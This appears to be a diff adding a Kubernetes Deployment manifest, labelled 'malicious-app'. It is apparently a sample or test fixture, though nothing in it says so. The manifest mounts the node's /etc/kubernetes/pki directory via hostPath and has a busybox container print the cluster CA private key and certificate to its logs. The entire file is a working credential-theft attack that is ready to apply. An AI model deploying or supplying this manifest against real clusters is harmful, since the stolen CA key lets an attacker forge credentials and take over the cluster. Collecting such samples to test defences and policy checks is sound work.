@@ -1,0 +1,28 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: malicious-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: malicious-app
+  template:
+    metadata:
+      labels:
+        app: malicious-app
+    spec:
+      containers:
+      - name: busybox
+        image: busybox:1.35.0
+        command:
+          - sh
+          - -c
+          - echo -e "KEY:\n"; cat /etc/kubernetes/pki/ca.key; echo -e "CRT\n";  cat /etc/kubernetes/pki/ca.crt; sleep 3600;
+        volumeMounts:
+          - name: k8s-certs
+            mountPath: /etc/kubernetes/pki
+      volumes:
+        - name: k8s-certs
+          hostPath:
+            path: /etc/kubernetes/pki
